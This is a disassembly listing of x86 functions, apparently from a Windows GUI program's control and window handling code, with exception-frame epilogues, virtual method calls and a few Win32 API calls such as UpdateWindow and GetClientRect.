call sub_438b34
mov [ ebx + 0x56 ] 0x1
sub_43a764
mov [ edx + 0xc ] 0x1
retn
sub_43a76c
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb013
call sub_439bf4
sub_43a784
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb014
call sub_439bf4
sub_43a79c
xor eax eax
mov [ edx + 0xc ] eax
retn
sub_43aa02
jmp sub_403994
sub_43aa09
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43aa34
mov eax [ r-xdata ]
retn
sub_43abd0
jmp sub_403994
sub_43abd7
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43acf8
mov eax [ eax + 0xb8 ]
retn
sub_43ad60
push ebx
mov ebx eax
mov eax ebx
call sub_439084
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax 0x20000
pop ebx
retn
sub_43ad7c
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_43af14
mov eax [ eax + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_43af44
mov edx [ eax ]
call [ edx + 0x34 ]
retn
sub_43af4c
call sub_437b00
retn
sub_43b04c
jmp sub_403994
sub_43b20c
jmp sub_403994
sub_43b25c
jmp sub_403994
sub_43b294
retn
sub_43b51d
jmp sub_403994
sub_43b6a5
jmp sub_403994
sub_43ba07
jmp sub_403994
sub_43bab3
jmp sub_403994
sub_43bac0
inc [ eax + 0x160 ]
retn
sub_43bac8
dec [ eax + 0x160 ]
cmp [ eax + 0x160 ] 0x0
jne r-xdata
retn
test [ eax + 0x54 ] 0x10
je r-xdata
call sub_43bae8
sub_43bae8
xor edx edx
call sub_43ba2c
retn
sub_43bbb5
jmp sub_403994
sub_43bbbc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43bcab
jmp sub_403994
sub_43c1d2
jmp sub_403994
sub_43c1d9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43c3a1
jmp sub_403994
sub_43c3a8
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43c47c
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov al 0x1
retn
sub_43c669
jmp sub_403994
sub_43c670
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x180 ] edx
pop ecx
pop ebp
retn
sub_43c760
xor eax eax
retn
sub_43c7c8
cmp [ eax + 0x180 ] 0x0
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0xb033
call sub_439bf4
sub_43c8f6
jmp sub_4036e0
sub_43ca2b
jmp sub_403994
sub_43ca32
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43ca3c
jmp sub_4036e0
sub_43ca41
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_458560
call sub_403a48
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43cffc
jmp sub_403994
sub_43d003
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43d00c
add esp 0xfffffff0
mov [ esp ] 0xf
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x10
retn
sub_43d50a
jmp sub_403994
sub_43d55c
push ebx
mov ebx eax
call sub_41b838
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax ebx
call sub_439bf4
pop ebx
retn
sub_43d578
mov ecx [ edx + 0x8 ]
push ecx
mov ecx [ edx + 0x4 ]
mov edx 0xb025
call sub_439bf4
retn
sub_43d58c
push 0x0
xor ecx ecx
mov edx 0xb026
call sub_439bf4
retn
sub_43d59c
push 0x0
xor ecx ecx
mov edx 0xb027
call sub_439bf4
retn
sub_43d848
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_43f538
pop esi
retn
sub_43d95c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_43d9ac
pop esi
retn
sub_43d970
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_43da98
pop esi
retn
sub_43d984
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_43d998
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x0
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_43da8b
jmp sub_403994
sub_43da92
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43db22
jmp sub_403994
sub_43db29
pop ebx
pop ecx
pop ebp
retn
sub_43db30
push esi
mov esi edx
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop esi
retn
sub_43db40
retn
sub_43db44
push ebx
cmp [ eax + 0x1c2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c4 ]
call [ ebx + 0x1c0 ]
sub_43db64
push ebx
cmp [ eax + 0x1ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1cc ]
call [ ebx + 0x1c8 ]
sub_43dcc4
mov edx [ eax + 0x178 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_43dd94
retn
sub_43deac
jmp sub_403994
sub_43deb3
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43df7e
jmp sub_403994
sub_43dfa8
xor ecx ecx
mov [ edx + 0xc ] ecx
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
retn
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov edx [ edx + 0x8 ]
mov eax [ eax + 0x17c ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
sub_43e03a
jmp sub_403994
sub_43e20c
push ebx
cmp [ eax + 0x1e2 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1e4 ]
call [ ebx + 0x1e0 ]
sub_43e4b0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x180 ] eax
mov [ esi + 0x1a6 ] 0x0
pop esi
retn
sub_43e58c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov dx 0xb023
mov eax esi
call sub_43bfb8
pop esi
retn
sub_43e650
push esi
mov si 0xffc1
call sub_403454
pop esi
retn
sub_43e67c
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_43e690
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_43e6a4
call sub_43bf78
retn
sub_43e6ac
call sub_43bf78
retn
sub_43e6b4
call sub_43bf78
retn
sub_43e75c
push ebx
mov ebx eax
mov eax ebx
call sub_43a610
mov edx [ ebx + 0x70 ]
mov eax [ ebx + 0x170 ]
call sub_41c9b0
mov dx 0xb009
mov eax ebx
call sub_43bfb8
pop ebx
retn
sub_43e8c0
call sub_43bf78
retn
sub_43e8c8
call sub_43bf78
retn
sub_43e8d0
call sub_43bf78
retn
sub_43e8d8
call sub_43bf78
retn
sub_43e93c
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_43edd2
jmp sub_403994
sub_43edd9
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43eeb8
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc0 ]
sub_43f05c
push 0x0
xor ecx ecx
mov edx 0xb034
call sub_439bf4
retn
sub_43f0fc
push ebx
mov ebx eax
mov eax ebx
call sub_43f52c
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x180 ]
push eax
call UpdateWindow
sub_43f118
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
pop ebx
retn
sub_43f2f0
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax ebx
call sub_43f228
push eax
call GetClientRect
pop esi
pop ebx
retn
sub_43f348
cmp edx [ eax + 0x16c ]
je r-xdata
retn
mov [ eax + 0x16c ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_439bf4
sub_43f368
cmp dl [ eax + 0x1a5 ]
je r-xdata
retn
mov [ eax + 0x1a5 ] dl
mov [ eax + 0x1a9 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb010
call sub_439bf4
sub_43f38c
mov al [ eax + 0x1a9 ]
xor al 0x1
retn
sub_43f398
cmp dl [ eax + 0x1a9 ]
je r-xdata
retn
mov [ eax + 0x1a9 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
call sub_439bf4
sub_43f444
test [ eax + 0x54 ] 0x8
je r-xdata
call sub_43f3e8
retn
movsx edx dx
mov [ eax + 0x1a0 ] edx
retn
sub_43f520
jmp sub_403994
sub_43f527
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43f746
jmp sub_403994
sub_43f74d
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43f854
call sub_4399c4
retn
sub_43fca2
jmp sub_403994
sub_43fd38
mov eax [ r-xdata ]
retn
sub_43fe9f
jmp sub_403994
sub_43ffb0
cmp dl [ eax + 0x165 ]
je r-xdata
retn
mov [ eax + 0x165 ] dl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_439bf4
sub_43ffd0
cmp edx [ eax + 0x168 ]
je r-xdata
retn
mov [ eax + 0x168 ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_439bf4
sub_4402e6
jmp sub_403994
sub_440428
test [ eax + 0x52 ] 0x4
setne al
retn
sub_440584
jmp sub_403994
sub_44058b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_41d330
retn
sub_4405a7
jmp sub_403994
sub_4405b4
retn
sub_440688
mov [ edx + 0xc ] 0xffffffff
retn
sub_4406e6
jmp sub_403994
sub_4406ed
pop ecx
pop ecx
pop ebp
retn
sub_44078d
jmp sub_403994
sub_440794
pop ebx
mov esp ebp
pop ebp
retn
sub_440800
call sub_43c780
retn
sub_440893
jmp sub_403994
sub_44089a
pop esi
pop ecx
pop ecx
pop ebp
retn
sub_440a79
jmp sub_403994
sub_440a80
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_440c9c
jmp sub_403994
sub_440cf0
cmp dx [ eax + 0x68 ]
je r-xdata
retn
mov [ eax + 0x68 ] dx
cmp [ eax + 0x6a ] 0x0
je r-xdata
call sub_440bdc
sub_440e34
push ebx
mov ebx eax
mov eax ebx
call sub_445b3c
test al al
je r-xdata
pop ebx
retn
push 0xffffffff
call ImageList_DragShowNolock
sub_440e4c
push ebx
mov ebx eax
mov eax ebx
call sub_445b3c
test al al
je r-xdata
pop ebx
retn
push 0x0
call ImageList_DragShowNolock
sub_440f38
push ebx
push esi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x100
mov edx esi
mov eax ebx
call sub_43d3b8
and [ ebx + 0x54 ] 0xfeff
pop esi
pop ebx
retn
sub_440fd3
jmp sub_403994
sub_440fda
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440ffd
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41d330
retn
sub_440ff6
jmp sub_403994
sub_440ffd
pop ebx
pop ecx
pop ebp
retn
sub_441004
retn
sub_44106c
xor edx edx
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov eax edx
retn
mov eax [ eax + 0xc ]
inc edx
test eax eax
jne r-xdata
sub_4413d9
jmp sub_403994
sub_4415c0
mov eax [ eax + 0x8 ]
jmp r-xdata
mov edx [ eax + 0xc ]
test edx edx
jne r-xdata
mov eax edx
retn
sub_4417ac
jmp sub_403994
sub_44185c
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
add [ ecx + 0x4 ] 0xc
retn
add [ ecx ] 0xc
retn
sub_441870
inc [ eax + 0x6c ]
retn
sub_441874
dec [ eax + 0x6c ]
cmp [ eax + 0x6c ] 0x0
jg r-xdata
retn
xor edx edx
mov [ eax + 0x6c ] edx
call sub_4430f4
sub_4419d4
call sub_4420d4
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
retn
sub_44237f
jmp sub_403994
sub_442386
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4423a3
lea eax [ ebp - 0xc ]
call sub_403f90
retn
sub_44239c
jmp sub_403994
sub_4423a3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_442684
jmp sub_403994
sub_44268b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4426a8
mov eax [ ebp - 0x4 ]
call sub_41d330
retn
sub_4426a1
jmp sub_403994
sub_4426a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4426c5
mov eax [ ebp - 0x4 ]
call sub_403258
retn
sub_4426be
jmp sub_403994
sub_4426c5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_442b79
jmp sub_403994
sub_442b80
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_442d0b
jmp sub_403994
sub_442d12
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_442dc7
jmp sub_403994
sub_442dce
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_442ebc
jmp sub_403994
sub_442f0d
jmp sub_403994
sub_442f14
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_442fd0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4418e0
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
sub_44311c
cmp [ eax + 0x6c ] 0x0
jne r-xdata
retn
mov eax edx
call sub_44141c
sub_443a1c
jmp sub_403994
sub_443a23
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_443aec
call GetCapture
retn
sub_443af4
push ebx
mov ebx edx
push ebx
call GetCursorPos
call sub_40c6a4
pop ebx
retn
sub_443b04
push ebx
mov ebx eax
push 0x13
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebx + 0xc ] al
pop ebx
retn
sub_443d6a
jmp sub_403994
sub_443f64
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
push eax
call [ rw-data ]
retn
sub_444178
jmp sub_403994
sub_44417f
pop ebx
mov esp ebp
pop ebp
retn
sub_4441ca
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
pop ebx
retn
sub_444247
jmp sub_403994
sub_44424e
pop ebp
retn
sub_4442d6
jmp sub_403994
sub_4442dd
pop ebp
retn
sub_444a2c
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x30 ]
xchg edx eax
call sub_413808
retn
sub_444a44
mov al 0x1
retn
sub_444a48
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
call sub_41957c
retn
mov eax edx
retn
sub_444a58
cmp [ eax + 0x5c ] 0x0
je r-xdata
call sub_41954c
retn
mov al 0x1
retn
sub_444d48
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_4137ac
pop esi
pop ebx
retn
sub_444d5c
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x8 ]
retn
sub_444d98
cmp edx [ eax + 0x38 ]
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0x30 ]
sub_444ffc
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
pop ebx
retn
sub_445010
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
pop ebx
retn
sub_445024
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
pop ebx
retn
sub_445038
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
pop ebx
retn
sub_44504c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
pop ebx
retn
sub_445060
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
pop ebx
retn
sub_445074
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
pop ebx
retn
sub_445088
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
pop ebx
retn
sub_44509c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
pop ebx
retn
sub_4450b0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
pop ebx
retn
sub_4450c4
retn
sub_4450c8
retn
sub_4450cc
retn
sub_4450d0
retn
sub_4450d4
retn
sub_4450d8
retn
sub_4450dc
retn
sub_4450e0
retn
sub_4450e4
retn
sub_4450e8
retn
sub_4450ec
retn
sub_4450f0
retn
sub_44539c
jmp sub_403994
sub_445738
push ebx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebx + 0x90 ] eax
sub_445760
push esi
mov si 0xffef
call sub_403454
pop esi
retn
sub_445801
jmp sub_403994
sub_445808
pop ebp
retn
sub_44580c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413034
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413034
sub_4459ac
mov edx eax
sub edx 0xff000000
je r-xdata
mov eax 0x20000000
sub edx 0xffffff
jne r-xdata
retn
mov eax 0x1fffffff
retn
sub_445b31
jmp sub_403994
sub_445b38
pop ebx
pop ecx
pop ebp
retn
sub_445b3c
cmp [ eax + 0x3c ] 0x0
setne al
retn
sub_445b44
cmp [ eax + 0x3c ] 0x0
jne r-xdata
retn
call sub_445d14
sub_445bf1
jmp sub_403994
sub_445bf8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
call sub_403258
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x54 ] edx
sub_445da7
jmp sub_403994
sub_445dae
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_445e46
jmp sub_403994
sub_445e4d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445e6a
mov eax [ ebp - 0xc ]
call sub_403258
retn
sub_445e63
jmp sub_403994
sub_445e6a
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403454
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_445f23
jmp sub_403994
sub_445f2a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_445f30
or edx 0xffffffff
call sub_445ea4
retn
sub_44633f
jmp sub_403994
sub_446346
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446363
mov eax [ ebp - 0xc ]
call sub_403258
retn
sub_44635c
jmp sub_403994
sub_446363
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446380
mov eax [ ebp - 0x4 ]
call sub_446e78
retn
sub_446379
jmp sub_403994
sub_446380
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_446584
jmp sub_403994
sub_44658b
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_446590
push esi
mov esi eax
cmp dl [ esi + 0x40 ]
je r-xdata
pop esi
retn
mov [ esi + 0x40 ] dl
mov eax esi
mov si 0xffef
call sub_403454
sub_4465a8
push ebx
mov ebx edx
mov ecx ebx
xor edx edx
xor eax eax
call sub_412350
pop ebx
retn
sub_44664c
mov [ edx + 0x4 ] eax
mov ecx [ eax + 0x4c ]
test ecx ecx
je r-xdata
retn
mov eax ecx
call sub_413650
sub_446763
jmp sub_403994
sub_44676a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403258
retn
sub_446780
jmp sub_403994
sub_446a92
jmp sub_403994
sub_446a99
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446ab6
mov eax [ ebp - 0x10 ]
call sub_403258
retn
sub_446aaf
jmp sub_403994
sub_446ab6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446ad3
mov eax [ ebp - 0x8 ]
call sub_403258
retn
sub_446acc
jmp sub_403994
sub_446ad3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_446b3c
jmp sub_403994
sub_446c55
jmp sub_403994
sub_446c72
jmp sub_403994
sub_446e2a
jmp sub_403994
sub_446e31
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_446e74
inc [ eax + 0x5c ]
retn
sub_446e78
push esi
cmp [ eax + 0x5c ] 0x0
jle r-xdata
cmp [ eax + 0x58 ] 0x0
je r-xdata
dec [ eax + 0x5c ]
pop esi
retn
mov [ eax + 0x58 ] 0x0
mov si 0xffef
call sub_403454
sub_446ecc
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_446f09
jmp sub_403994
sub_446f10
pop ebp
retn
sub_446f14
sub [ rw-data ] 0x1
retn
sub_447c25
inc esp
add al bh
iretd
sub_447e7c
mov eax [ esp + 0x8 ]
retn
sub_447e84
push ebx
mov ebx eax
call sub_447e7c
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
jmp sub_4039cc
sub_447ea0
pop ebx
retn
sub_448119
jmp sub_403994
sub_448120
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44826b
jmp sub_403994
sub_448272
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_448288
push ebx
mov eax [ rw-data ]
call sub_413cac
mov ebx eax
movzx edx bx
mov cl 0x1
mov eax [ rw-data ]
call sub_413c80
mov eax ebx
pop ebx
retn
sub_448410
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403408
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_44842c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403408
mov al [ eax + 0x95 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0xa8 ]
sete al
pop ebx
retn
sub_448b27
jmp sub_403994
sub_448b2e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_448c26
jmp sub_403994
sub_448c2d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_449050
jmp sub_403994
sub_449057
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_449503
jmp sub_403994
sub_4499a4
jmp sub_403994
sub_4499ab
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_449e0f
jmp sub_403994
sub_44a2cc
jmp sub_403994
sub_44a2d3
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44a67e
jmp sub_403994
sub_44a685
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_44a693
inc [ ecx ]
add [ eax ] al
add [ 0xffffffffb0000000 ] ch
add ebx eax
nop
cmp dl [ eax + 0x48 ]
je r-xdata
retn
mov [ eax + 0x48 ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44a840
mov eax [ r-xdata ]
retn
sub_44a87c
cmp dx [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44a890
cmp dl [ eax + 0x3e ]
je r-xdata
retn
mov [ eax + 0x3e ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44a8a0
cmp edx [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] edx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44a8b0
or edx 0xffffffff
mov ecx [ eax + 0x64 ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov edx eax
mov eax ecx
call sub_44abac
mov edx eax
sub_44a948
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_403408
mov edx esi
call sub_44a8c8
pop esi
pop ebx
retn
sub_44a9c4
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_44abac
push esi
or ecx 0xffffffff
mov esi [ eax + 0x5c ]
test esi esi
je r-xdata
mov eax ecx
pop esi
retn
mov eax esi
call sub_413808
mov ecx eax
sub_44ad9c
mov edx [ eax + 0x64 ]
test edx edx
je r-xdata
mov eax edx
retn
cmp [ edx + 0x70 ] 0x0
je r-xdata
mov eax [ edx + 0x70 ]
retn
sub_44ae04
jmp r-xdata
mov edx [ eax + 0x64 ]
test edx edx
jne r-xdata
mov eax edx
mov eax [ eax + 0x70 ]
retn
sub_44b1ac
cmp edx [ eax + 0x7c ]
jne r-xdata
retn
call sub_44b1e0
sub_44b1e0
mov edx sub_44b1b8
mov ecx eax
mov eax [ eax + 0x68 ]
xchg edx eax
call sub_448308
retn
sub_44b3ca
jmp sub_403994
sub_44b3d1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44b868
jmp sub_403994
sub_44b8a7
jmp sub_403994
sub_44b8ae
mov al [ ebp - 0x1a ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44ba4c
cmp dl [ eax + 0x3c ]
je r-xdata
retn
mov [ eax + 0x3c ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44bb88
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ eax + 0x34 ]
mov si 0xfffd
call sub_403454
pop esi
pop ebp
retn 0x8
sub_44bba4
mov eax [ eax + 0x34 ]
call sub_448ddc
retn
sub_44bbb0
push esi
mov esi eax
mov eax [ esi + 0x34 ]
mov si 0xfff9
call sub_403454
pop esi
retn
sub_44bbec
push ebx
mov ecx sub_44bbc4
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_448308
pop ebx
retn
sub_44be20
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov al 0x1
retn
cmp [ eax + 0x48 ] 0x0
jne r-xdata
xor eax eax
retn
sub_44be34
jmp r-xdata
test edx edx
jle r-xdata
retn
test eax eax
jne r-xdata
mov eax [ eax + 0x64 ]
dec edx
j_sub_4036e0#7
jmp sub_4036e0
sub_44c06b
jmp sub_403994
sub_44c096
jmp sub_403994
sub_44c09d
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov al 0x1
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_44c0b4
mov al [ eax + 0x41 ]
xor al 0x1
retn
sub_44c29c
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_44bbec
sub_44c31c
jmp sub_403994
sub_44c360
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_44c378
push ebx
mov ebx eax
mov eax ebx
call sub_41959c
xor ecx ecx
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop ebx
retn
sub_44c3ca
add [ eax ] al
cmp edx [ eax + 0x48 ]
jne r-xdata
retn
call sub_44bbec
sub_44c440
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
